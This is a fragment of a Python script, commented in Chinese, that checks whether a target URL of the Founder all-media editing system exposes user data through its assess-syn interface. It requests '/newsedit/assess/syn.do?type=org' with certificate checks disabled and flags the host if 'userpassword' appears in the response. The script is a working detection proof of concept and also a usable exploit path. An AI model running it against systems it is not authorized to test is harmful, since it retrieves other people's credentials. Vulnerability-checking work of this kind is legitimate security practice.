...
def check_vulnerability(url):
    try:
        # 构建攻击URL
        attack_url = url.rstrip('/') + "/newsedit/assess/syn.do?type=org"
    
        # 向服务器发送请求
        response = requests.get(attack_url, verify=False, timeout=10)
    
        # 检查响应状态码和响应体中的关键字
        if response.status_code == 200 and 'userpassword' in response.text:
            print(f"{RED}URL [{url}] 方正全媒体采编系统assess-syn接口存在信息泄露漏洞。{RESET}")
        else:
...
def main():
    parser = argparse.ArgumentParser(description='检查目标URL是否存在方正全媒体采编系统assess-syn接口信息泄露漏洞。')
